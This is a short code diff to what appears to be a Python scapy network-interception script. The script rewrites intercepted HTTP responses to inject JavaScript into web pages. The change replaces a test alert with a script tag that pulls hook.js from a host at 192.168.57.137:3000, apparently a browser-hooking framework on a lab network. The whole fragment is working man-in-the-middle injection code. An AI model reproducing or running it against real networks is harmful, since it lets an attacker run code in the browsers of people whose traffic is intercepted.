@@ -28,7 +28,7 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             if "</body>" in str(load):
-                inj_code = "<script>alert('test')</script>"
+                inj_code = '<script src="http://192.168.57.137:3000/hook.js">console.log("test")</script>'
                 load = load.replace(
                     "</body>", inj_code + "</body>")
                 content_length_search = re.search(
